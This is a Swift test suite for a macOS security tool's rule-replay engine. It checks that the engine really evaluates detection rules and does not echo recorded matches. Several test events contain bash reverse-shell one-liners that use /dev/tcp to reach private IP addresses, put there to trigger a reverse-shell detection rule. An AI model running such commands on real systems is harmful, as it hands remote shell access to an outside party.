// RuleEngineReplayerTests.swift
//
// The point of these tests is one distinction: a replayer that RUNS rules
// versus one that re-emits what was recorded. The shipped
// EchoRulesetReplayer / BundleEmbeddedRulesetReplayer both ignore their
// `events` argument and return `matchedRules` verbatim, so they pass any
// test that only checks "the expected rules came back".
//
// So every test here feeds `matchedRules` that DISAGREES with the events.
// An echo implementation fails all of them.

import Testing
import Foundation
@testable import MacCrabCore

@Suite("TraceBundle: RuleEngineReplayer (real evaluation, not echo)")
struct RuleEngineReplayerTests {

    static let compiledRules = URL(fileURLWithPath: "/tmp/maccrab_v3")
    static let reverseShellRuleId = "d1a2b3c4-0042-4000-a000-000000000042"

    /// Mirrors OfflineReplayLane.processCreationEvent: `commandLine` is the
    /// ARGV joined with a single space, exactly as ESCollector reconstructs it
    /// (ESCollector.swift:1591). Building the line any other way would test a
    /// shape the sensor never emits.
    static func eventLine(argv: [String], id: String) throws -> String {
        let fixed = Date(timeIntervalSince1970: 1_700_000_000)
        let program = argv.first ?? ""
        let executable = program.hasPrefix("/") ? program : "/usr/bin/\(program)"
        let process = MacCrabCore.ProcessInfo(
            pid: 4242, ppid: 1, rpid: 1,
            name: (executable as NSString).lastPathComponent,
            executable: executable,
            commandLine: argv.joined(separator: " "),
            args: argv,
            workingDirectory: "/tmp",
            userId: 501, userName: "replaytest", groupId: 20,
            startTime: fixed
        )
        let event = Event(
            id: UUID(uuidString: id)!,
            timestamp: fixed,
            eventCategory: .process,
            eventType: .creation,
            eventAction: "exec",
            process: process
        )
        let data = try JSONEncoder().encode(event)
        return String(data: data, encoding: .utf8)!
    }

    /// A recorded artifact that is deliberately WRONG for the events supplied.
    static func fabricatedMatches() -> [MatchedRulesArtifact.Rule] {
        [MatchedRulesArtifact.Rule(
            ruleId: "ffffffff-dead-4000-a000-ffffffffffff",
            ruleVersion: "recorded-v0",
            severity: "critical",
            matchedEventId: nil,
            stateRequirements: []
        )]
    }

    @Test("Evaluates the events — a fabricated recorded match is NOT echoed back")
    func evaluatesRatherThanEchoes() async throws {
        ensureRulesCompiled()
        let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)

        let line = try Self.eventLine(
            argv: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
            id: "00000000-0000-0000-0000-000000000001")

        let alerts = try await replayer.replay(events: [line], matchedRules: Self.fabricatedMatches())

        // The fabricated rule must NOT appear — an echo replayer would return it.
        #expect(!alerts.contains { $0.ruleId == "ffffffff-dead-4000-a000-ffffffffffff" })
        // A real evaluation of a reverse shell fires the reverse-shell rule.
        #expect(alerts.contains { $0.ruleId == Self.reverseShellRuleId })
    }

    @Test("A benign event yields nothing, even when the recording claims a match")
    func benignEventDoesNotInheritRecordedMatches() async throws {
        ensureRulesCompiled()
        let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)

        let line = try Self.eventLine(
            argv: ["/bin/ls", "-la", "/tmp"],
            id: "00000000-0000-0000-0000-000000000002")

        let alerts = try await replayer.replay(events: [line], matchedRules: Self.fabricatedMatches())
        // This is the regression that matters: the recording said a critical
        // rule fired; the events say otherwise; the events win.
        #expect(!alerts.contains { $0.ruleId == "ffffffff-dead-4000-a000-ffffffffffff" })
    }

    @Test("Result carries the ruleset that ran, not the version in the recording")
    func versionReflectsTheRulesetThatRan() async throws {
        ensureRulesCompiled()
        let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
        let line = try Self.eventLine(
            argv: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
            id: "00000000-0000-0000-0000-000000000003")

        let alerts = try await replayer.replay(events: [line], matchedRules: Self.fabricatedMatches())
        let hit = try #require(alerts.first { $0.ruleId == Self.reverseShellRuleId })
        // Never the recorded label — that would attribute a fresh result to a
        // ruleset that never ran.
        #expect(hit.ruleVersion != "recorded-v0")
        #expect(hit.ruleVersion.hasPrefix("ruleset-"))
    }

    @Test("One entry per rule, even when several events fire the same rule")
    func dedupesByRule() async throws {
        ensureRulesCompiled()
        let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
        let a = try Self.eventLine(argv: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
                                   id: "00000000-0000-0000-0000-000000000004")
        let b = try Self.eventLine(argv: ["sh", "-c", "/bin/sh -i >& /dev/tcp/192.168.1.5/9001 0>&1"],
                                   id: "00000000-0000-0000-0000-000000000005")

        let alerts = try await replayer.replay(events: [a, b], matchedRules: [])
        let ids = alerts.map(\.ruleId)
        #expect(ids.count == Set(ids).count, "duplicate rule ids in the replay result")
    }

    @Test("Ruleset digest is content-addressed and folds in the status gate")
    func rulesetDigestIsHonest() async throws {
        ensureRulesCompiled()
        let all = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
        let same = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
        #expect(all.rulesetSha256 == same.rulesetSha256)

        // The status gate changes which rules evaluate, so it must change the
        // digest — otherwise a `stable` result and an `all` result compare as
        // though they measured the same thing.
        let stableOnly = try RuleEngineReplayer(rulesDirectory: Self.compiledRules,
                                                enabledStatuses: ["stable"])
        #expect(stableOnly.rulesetSha256 != all.rulesetSha256)

        // And content: a directory with different rule bytes hashes differently.
        let tmp = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("replayer-digest-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmp) }
        try Data("[]".utf8).write(to: tmp.appendingPathComponent("a.json"))
        let other = try RuleEngineReplayer(rulesDirectory: tmp)
        #expect(other.rulesetSha256 != all.rulesetSha256)
    }

    @Test("An undecodable event line throws instead of silently shrinking the corpus")
    func undecodableLineThrows() async throws {
        ensureRulesCompiled()
        let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
        // Skipping a bad line would quietly reduce the corpus, and a smaller
        // corpus makes recall look better than it is.
        await #expect(throws: RuleEngineReplayer.ReplayError.self) {
            _ = try await replayer.replay(events: ["{not json at all"], matchedRules: [])
        }
    }

    @Test("An empty compiled-rules directory is refused, not treated as zero matches")
    func emptyRulesetRefused() throws {
        let tmp = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("replayer-empty-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmp) }
        // "No rules loaded" and "no rules matched" produce identical output but
        // mean opposite things. Refuse at construction.
        #expect(throws: RuleEngineReplayer.ReplayError.self) {
            _ = try RuleEngineReplayer(rulesDirectory: tmp)
        }
    }

    @Test("Deterministic — identical input yields an identical result")
    func deterministic() async throws {
        ensureRulesCompiled()
        let replayer = try RuleEngineReplayer(rulesDirectory: Self.compiledRules)
        let lines = [
            try Self.eventLine(argv: ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
                               id: "00000000-0000-0000-0000-000000000006"),
            try Self.eventLine(argv: ["/bin/ls", "-la"],
                               id: "00000000-0000-0000-0000-000000000007"),
        ]
        let first = try await replayer.replay(events: lines, matchedRules: [])
        let second = try await replayer.replay(events: lines, matchedRules: [])
        #expect(first == second)
    }
}
